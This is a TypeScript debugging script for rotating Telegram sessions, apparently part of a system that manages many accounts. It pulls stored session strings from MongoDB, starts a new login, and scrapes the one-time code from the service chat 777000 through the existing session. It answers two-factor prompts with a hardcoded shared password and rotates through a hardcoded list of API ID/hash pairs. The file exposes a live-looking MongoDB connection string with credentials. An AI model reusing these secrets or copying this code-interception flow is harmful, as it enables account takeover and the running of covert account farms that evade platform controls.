/**
 * Standalone test script for session rotation debugging.
 *
 * Tests:
 * 1. Connect with existing session, read 777000 messages
 * 2. Check Redis config (apiId, cached fingerprint)
 * 3. Optionally clear Redis config so next attempt uses custom apiId
 * 4. Attempt createNewSession and observe OTP delivery
 *
 * Usage:
 *   npx ts-node scripts/test-session-rotation.ts <mobile> [--clear-redis] [--skip-create]
 */

import { TelegramClient, Api } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { sleep } from 'telegram/Helpers';
import * as mongoose from 'mongoose';

// ──────────────────────────────────────
// Config
// ──────────────────────────────────────

const MONGO_URI = process.env.MONGO_URI || process.env.mongouri || 'mongodb://sk123:B7lGqaFlMDnKAB1m@ac-oux75kn-shard-00-00.iucpdpe.mongodb.net:27017,ac-oux75kn-shard-00-01.iucpdpe.mongodb.net:27017,ac-oux75kn-shard-00-02.iucpdpe.mongodb.net:27017/tgclients?ssl=true&retryWrites=true&replicaSet=atlas-137i8d-shard-0&readPreference=primary&connectTimeoutMS=10000&authSource=admin&authMechanism=SCRAM-SHA-1';
const REDIS_URL = process.env.REDIS_URL || 'redis://127.0.0.1:6379';

const args = process.argv.slice(2);
const mobile = args.find(a => !a.startsWith('--'));
const clearRedis = args.includes('--clear-redis');
const skipCreate = args.includes('--skip-create');

if (!mobile) {
    console.error('Usage: npx ts-node scripts/test-session-rotation.ts <mobile> [--clear-redis] [--skip-create]');
    process.exit(1);
}

function log(step: string, msg: string, data?: any) {
    const ts = new Date().toISOString();
    console.log(`[${ts}] [${step}] ${msg}`);
    if (data !== undefined) console.log(JSON.stringify(data, null, 2));
}

// ──────────────────────────────────────
// MongoDB: get session from users collection
// ──────────────────────────────────────

let _db: mongoose.mongo.Db;

async function getUserSession(mobile: string): Promise<{ session: string; tgId: string } | null> {
    const user = await _db.collection('users').findOne({ mobile });
    if (!user || !user.session) return null;
    return { session: user.session as string, tgId: String(user.tgId) };
}

async function getBufferClientSession(mobile: string): Promise<{ session: string; warmupPhase: string } | null> {
    const bc = await _db.collection('bufferclients').findOne({ mobile });
    if (!bc || !bc.session) return null;
    return { session: bc.session as string, warmupPhase: (bc.warmupPhase as string) || 'unknown' };
}

// ──────────────────────────────────────
// Redis: check/clear config cache
// ──────────────────────────────────────

async function checkRedisConfig(mobile: string): Promise<any> {
    if (!REDIS_URL) {
        log('REDIS', 'No REDIS_URL set — skipping Redis check');
        return null;
    }
    try {
        const Redis = (await import('ioredis')).default;
        const redis = new Redis(REDIS_URL);
        const configKey = `tg:config:${mobile}`;
        const proxyKey = `tg:proxy_map:${mobile}`;

        const config = await redis.get(configKey);
        const proxy = await redis.get(proxyKey);

        log('REDIS', `Config key: ${configKey}`, config ? JSON.parse(config) : 'NOT FOUND');
        log('REDIS', `Proxy key: ${proxyKey}`, proxy ? JSON.parse(proxy) : 'NOT FOUND');

        if (clearRedis) {
            await redis.del(configKey);
            await redis.del(proxyKey);
            log('REDIS', `CLEARED both keys for ${mobile}`);
        }

        await redis.quit();
        return config ? JSON.parse(config) : null;
    } catch (err: any) {
        log('REDIS', `Error: ${err.message}`);
        return null;
    }
}

// ──────────────────────────────────────
// Telegram: connect and test
// ──────────────────────────────────────

async function testConnection(session: string, apiId: number, apiHash: string, label: string): Promise<TelegramClient | null> {
    log(label, `Connecting with apiId=${apiId}...`);
    const client = new TelegramClient(
        new StringSession(session),
        apiId,
        apiHash,
        {
            connectionRetries: 3,
            requestRetries: 3,
            retryDelay: 2000,
            timeout: 30,
            autoReconnect: true,
        }
    );

    try {
        await client.connect();
        const me = await client.getMe() as Api.User;
        log(label, `Connected OK — phone=${me.phone}, id=${me.id}, firstName=${me.firstName}`);
        return client;
    } catch (err: any) {
        log(label, `Connection FAILED: ${err.message}`);
        return null;
    }
}

async function readChat777000(client: TelegramClient, label: string): Promise<void> {
    log(label, 'Reading last 5 messages from chat 777000...');
    try {
        const messages = await client.getMessages('777000', { limit: 5 });
        log(label, `Got ${messages.length} messages from 777000`);
        for (const msg of messages) {
            const ageMs = Date.now() - msg.date * 1000;
            const ageDays = Math.round(ageMs / (24 * 60 * 60 * 1000));
            log(label, `  Message: date=${new Date(msg.date * 1000).toISOString()}, age=${ageDays}d, text="${msg.text?.substring(0, 120)}"`);
        }
    } catch (err: any) {
        log(label, `Failed to read 777000: ${err.message}`);
    }
}

async function attemptNewSession(
    existingClient: TelegramClient,
    newApiId: number,
    newApiHash: string,
): Promise<string | null> {
    log('NEW-SESSION', '====== Starting new session creation ======');

    const me = await existingClient.getMe() as Api.User;
    log('NEW-SESSION', `Phone: ${me.phone}`);

    // Read 777000 BEFORE triggering login
    log('NEW-SESSION', '--- Messages in 777000 BEFORE login attempt ---');
    await readChat777000(existingClient, 'BEFORE');

    const newClient = new TelegramClient(
        new StringSession(''),
        newApiId,
        newApiHash,
        {
            connectionRetries: 3,
            requestRetries: 3,
            retryDelay: 2000,
            timeout: 30,
            autoReconnect: true,
        }
    );

    let otpReceived = false;

    try {
        const startTime = Date.now();

        await Promise.race([
            newClient.start({
                phoneNumber: me.phone,
                password: async () => {
                    log('NEW-SESSION', '2FA password callback triggered — returning standard password');
                    return 'Ajtdmwajt1@';
                },
                phoneCode: async () => {
                    log('NEW-SESSION', 'phoneCode callback triggered — OTP was requested by Telegram');
                    log('NEW-SESSION', `Time since start: ${Date.now() - startTime}ms`);

                    // Read 777000 immediately
                    log('NEW-SESSION', '--- Messages in 777000 RIGHT AFTER phoneCode callback ---');
                    await readChat777000(existingClient, 'IMMEDIATE');

                    // Wait 3s and read again
                    log('NEW-SESSION', 'Waiting 3s for OTP delivery...');
                    await sleep(3000);
                    log('NEW-SESSION', '--- Messages in 777000 AFTER 3s wait ---');
                    await readChat777000(existingClient, 'AFTER-3S');

                    // Wait 5s more and read again
                    log('NEW-SESSION', 'Waiting 5s more...');
                    await sleep(5000);
                    log('NEW-SESSION', '--- Messages in 777000 AFTER 8s total ---');
                    await readChat777000(existingClient, 'AFTER-8S');

                    // Try to extract code from latest message
                    const messages = await existingClient.getMessages('777000', { limit: 1 });
                    const message = messages[0];
                    if (message) {
                        const ageS = Math.round((Date.now() - message.date * 1000) / 1000);
                        log('NEW-SESSION', `Latest message age: ${ageS}s, text: "${message.text?.substring(0, 150)}"`);

                        if (ageS < 120) {
                            // Try parsing the code
                            let code: string | null = null;

                            // Method 1: code:** pattern
                            if (message.text?.includes('code:**')) {
                                code = message.text.split('.')[0].split('code:**')[1]?.trim();
                                log('NEW-SESSION', `Parsed via code:** pattern: "${code}"`);
                            }

                            // Method 2: regex for 5-digit number
                            if (!code) {
                                const match = message.text?.match(/(\d{5})/);
                                code = match?.[1] || null;
                                log('NEW-SESSION', `Parsed via regex: "${code}"`);
                            }

                            if (code) {
                                otpReceived = true;
                                log('NEW-SESSION', `Returning OTP: ${code}`);
                                return code;
                            }
                        }

                        log('NEW-SESSION', 'Message too old or unparseable — OTP NOT received');
                    }

                    throw new Error('OTP not received in chat 777000 after 8s');
                },
                onError: (err: Error) => {
                    log('NEW-SESSION', `onError callback: ${err.message}`);
                    throw err;
                },
            }),
            new Promise<never>((_, reject) =>
                setTimeout(() => reject(new Error('Session creation timed out after 90s')), 90000)
            ),
        ]);

        const session = newClient.session.save() as unknown as string;
        log('NEW-SESSION', `SUCCESS! New session length=${session?.length}, took ${Date.now() - startTime}ms`);
        await newClient.destroy();
        return session;

    } catch (err: any) {
        log('NEW-SESSION', `FAILED: ${err.message}`);

        // Read 777000 one final time to see if OTP arrived late
        if (!otpReceived) {
            log('NEW-SESSION', '--- Final check of 777000 after failure ---');
            await readChat777000(existingClient, 'POST-FAILURE');
        }

        try { await newClient.destroy(); } catch {}
        return null;
    }
}

// ──────────────────────────────────────
// Main
// ──────────────────────────────────────

async function main() {
    log('MAIN', `Testing session rotation for mobile: ${mobile}`);
    log('MAIN', `Options: clearRedis=${clearRedis}, skipCreate=${skipCreate}`);

    // Step 1: Connect to MongoDB
    log('MAIN', 'Connecting to MongoDB...');
    const conn = await mongoose.connect(MONGO_URI);
    _db = conn.connection.db!;
    log('MAIN', 'MongoDB connected');

    // Step 2: Get sessions from DB
    const userData = await getUserSession(mobile!);
    const bufferData = await getBufferClientSession(mobile!);

    log('DB', 'User record', userData ? { tgId: userData.tgId, sessionLen: userData.session.length } : 'NOT FOUND');
    log('DB', 'Buffer client record', bufferData ? { warmupPhase: bufferData.warmupPhase, sessionLen: bufferData.session.length } : 'NOT FOUND');

    const session = bufferData?.session || userData?.session;
    if (!session) {
        log('MAIN', 'No session found in either users or bufferclients — aborting');
        process.exit(1);
    }

    // Step 3: Check Redis config
    const redisConfig = await checkRedisConfig(mobile!);
    const cachedApiId = redisConfig?._apiId;
    log('ANALYSIS', `Cached apiId in Redis: ${cachedApiId || 'NONE (will generate fresh)'}`);

    // Step 4: Determine which apiId to use
    // Use custom credentials (from tg-config.ts) — pick based on stable hash
    const { stableHash } = await import('../src/components/Telegram/utils/tg-config');
    const API_CREDENTIALS = [
        { apiId: 27919939, apiHash: '5ed3834e741b57a560076a1d38d2fa94' },
        { apiId: 25328268, apiHash: 'b4e654dd2a051930d0a30bb2add80d09' },
        { apiId: 12777557, apiHash: '05054fc7885dcf18eb7432865ea3500' },
        { apiId: 27565391, apiHash: 'a3a0a2e895f893e2067dae111b20f2d9' },
        { apiId: 27586636, apiHash: 'f020539b6bb5b945186d39b3ff1dd998' },
        { apiId: 29210552, apiHash: 'f3dbae7e628b312c829e1bd341f1e9a9' },
    ];
    const credIndex = stableHash(`${mobile}-credentials`) % API_CREDENTIALS.length;
    const freshCreds = API_CREDENTIALS[credIndex];

    log('ANALYSIS', `Fresh credentials for this mobile: apiId=${freshCreds.apiId} (index=${credIndex})`);
    if (cachedApiId && cachedApiId !== freshCreds.apiId) {
        log('ANALYSIS', `⚠️  MISMATCH: Redis has apiId=${cachedApiId}, fresh would be apiId=${freshCreds.apiId}`);
    }

    // Step 5: Connect existing session with BOTH apiIds to compare
    // Use the cached apiId first (what the system currently does)
    const useApiId = cachedApiId || freshCreds.apiId;
    const useApiHash = redisConfig?._apiHash || freshCreds.apiHash;

    log('CONNECT', `Connecting existing session with apiId=${useApiId}...`);
    const existingClient = await testConnection(session, useApiId, useApiHash, 'EXISTING');

    if (!existingClient) {
        log('MAIN', 'Cannot connect existing session — aborting');
        await mongoose.disconnect();
        process.exit(1);
    }

    // Step 6: Read 777000 messages
    await readChat777000(existingClient, 'INITIAL');

    // Step 7: Check authorizations (how many sessions exist)
    try {
        const authResult = await existingClient.invoke(new Api.account.GetAuthorizations());
        log('AUTHS', `Total active sessions: ${authResult.authorizations.length}`);
        for (const auth of authResult.authorizations) {
            log('AUTHS', `  ${auth.current ? '→ CURRENT' : '  '} apiId=${auth.apiId} device="${auth.deviceModel}" app="${auth.appName}" platform="${auth.platform}" country="${auth.country}" dateActive=${new Date((auth.dateActive || 0) * 1000).toISOString()}`);
        }
    } catch (err: any) {
        log('AUTHS', `Failed to get authorizations: ${err.message}`);
    }

    // Step 8: Attempt new session creation (unless --skip-create)
    if (!skipCreate) {
        log('MAIN', '');
        log('MAIN', '═══════════════════════════════════════');
        log('MAIN', `Attempting new session with apiId=${freshCreds.apiId} (FRESH custom credentials)`);
        log('MAIN', '═══════════════════════════════════════');

        const newSession = await attemptNewSession(existingClient, freshCreds.apiId, freshCreds.apiHash);

        if (newSession) {
            log('RESULT', `✅ Session creation SUCCEEDED! Length=${newSession.length}`);
        } else {
            log('RESULT', '❌ Session creation FAILED');
        }
    } else {
        log('MAIN', '--skip-create flag set, skipping session creation attempt');
    }

    // Cleanup
    try { await existingClient.destroy(); } catch {}
    await mongoose.disconnect();
    log('MAIN', 'Done');
}

main().catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});
